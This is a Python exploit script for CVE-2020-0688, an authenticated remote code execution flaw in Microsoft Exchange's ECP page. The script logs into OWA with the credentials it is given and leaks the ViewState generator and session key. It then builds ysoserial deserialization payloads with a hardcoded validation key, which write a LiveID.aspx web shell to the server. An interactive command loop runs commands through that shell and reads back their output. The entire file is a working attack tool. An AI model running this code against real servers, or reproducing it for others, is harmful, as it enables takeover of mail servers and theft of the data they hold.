import urllib.parse
import requests
import os
import re
import sys
import base64
import subprocess
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__AUTHOR__ = "github.com/w4fz5uck5"
__EXPLOIT__ = ("github.com/zcgonvh/CVE-2020-0688", "github.com/Ridter/cve-2020-0688")

def CraftREQ(target, data=None, method="", cookies=None, proxy=None):
    """
        Craft URL POST/GET Request, then return it
        
    """

    if method == "POST":

        req = requests.post
        
    else:

        req = requests.get

    headers = {

        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    resp = req(
        target, data=data, headers=headers, cookies=cookies,
        verify=False, allow_redirects=False, proxies=proxy
     )

    return resp, dict(resp.cookies.items())

def LoginExchange(target, user, password, proxy=None):
    """
        Login into Exchange service

    """

    login_url = "%s/owa/auth.owa" % target
    
    data = (
        "destination=" + urllib.parse.quote(target) + "%2Fecp%2F&flags=4&forcedownlevel=0" 
        "&username=" + user + "&password=" + password + "&passwordText=&isUtf8=1"
    )

    try:
        
        resp, cookies = CraftREQ(login_url, data=data, method="POST", cookies=None, proxy=proxy)
        
        if resp.status_code == 302:
    
            print("\n[+] GOT RESPONSE | code:[%s] | length:[%s]" % (resp.status_code, len(resp.text)))

            return cookies
        
        else:

            print("\n[-] GOT UNKNOW RESPONSE | code:[%s] | length:[%s]" % (resp.status_code, len(resp.text)))

        return False

    except Exception as e:

        print("\n[-] Failed Attempt to login w/ [%s:%s]\n%s" % (user, password, str(e)))
    
        return False

def LeakView(target, cookies=None):
    """
        Leak __VIEWSTATEGENERATOR value

    """
    
    target += "/ecp/default.aspx"       

    resp, cookies = CraftREQ(target, method="GET", cookies=cookies, proxy=proxy)

    key = cookies["ASP.NET_SessionId"]

    print("\n[+] Utilizing valid session key [ASP.NET_SessionId]: [%s]" % key)

    # https://github.com/Ridter/cve-2020-0688
    try:

        _vsg = re.compile(
            'id="__VIEWSTATEGENERATOR" value="(.+?)"').findall(str(resp.text))[0]
        
        print("[+] Done! VIEWSTATEGENERATOR: " + _vsg)

    except:

        _vsg = "B97B4E27"

        print("\n[*] Could not find viewstategenerator, trying default value: [%s]" % _vsg)
 
    return _vsg, key, cookies

if __name__ == "__main__":
    print("\n------------------------------------------------------------------")
    print("Exchange [/ecp/default.aspx] - Authenticated Remote Code Execution")
    print(".NET Deserialization Vulnerability - ASPX [Web Shell] upload technique")
    print("CVE: CVE-2020-0688")
    print("Script made by: github.com/w4fz5uck5")
    print("------------------------------------------------------------------\n")

    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--server", required=True, help="Exchange URL, e.g: https://site.com")
    parser.add_argument("-u", "--user", required=True, help="Login Account, e.g: domain\\user")
    parser.add_argument("-p", "--password", required=True, help="Login Password")
    parser.add_argument("-x", "--proxy", help="HTTPS proxy for debbuging")
    args = parser.parse_args()

    target = args.server
    user = args.user
    password = args.password

    if args.proxy:

        proxy = {

            "https": str(args.proxy)
        }

    else:

        proxy = None

    user_session_cookie = LoginExchange(target, user, password, proxy=proxy)
    
    _vsg, key, cookies = LeakView(target, cookies=user_session_cookie)

    print("\n[+] %s Seems vulnerable!\n[+] Spawning shell!\n" % target)

    while True:
        
        cmd = input("cmd> ")
        dir = True if "dir" in cmd else False

        cmd = (
              f"""powershell -nop -ep bypass -c \\"Write-Host '<% \''"'({cmd})'"'\' %>'\\" > \\"%exchangeinstallpath%\\\\ClientAccess\\\\ecp\\\\LiveID.aspx\\" """
        )

        ysoserial = (
            '/ysoserial/ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "%s" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="%s" --viewstateuserkey="%s" --isdebug â€“islegacy' % (cmd, _vsg, key)
        )

        output = subprocess.Popen(os.getcwd() + ysoserial, stdout=subprocess.PIPE).stdout.read()

        output = re.compile(
            "(\/wE.*)").findall(str(output))[0].rstrip("\n")

        output = output.replace("'", "")

        rce_url = (
            target + "/ecp/default.aspx?__VIEWSTATEGENERATOR=" + _vsg + "&__VIEWSTATE=" + urllib.parse.quote(output)
        )

        new_cookie = user_session_cookie
        new_cookie["ASP.NET_SessionId"] = str(key) # Set-Cookie("ASP.NET_SessionId=xxxx")

        resp, _ = CraftREQ(rce_url, method="GET", cookies=new_cookie, proxy=proxy)
        
        if resp.status_code == 500:

            print("\n[+] Command Executed!")

        rce_output = target + "/ecp/LiveID.aspx" # webshell

        resp, _ = CraftREQ(rce_output, method="GET", cookies=user_session_cookie, proxy=proxy)

        if (resp.status_code == "404") or (resp.status_code == "302"):
            
            print("\n[-] code:[%s] | Could not create [/ecp/LiveID.aspx] webshell..." % resp.status_code)
            sys.exit(0)

        try:

            output_regex = re.compile(
                "&#39;(.*?)&#39;").findall(str(resp.text))[0]

            print("------------------------------")

            if dir:

                output_regex = output_regex.replace(" ", "\n")
                print(output_regex)

            else:

                print("\n" + output_regex + "\n")

        except Exception as err:
            
            print("[!] Could not get command output because some WAF's block")
            print("[!] Try to check for some weird Cookie values in your browser, like X-BackEndCookie")
            print("[*] Should be necessary to re-login through browser to allow your IP Request in current user session")            
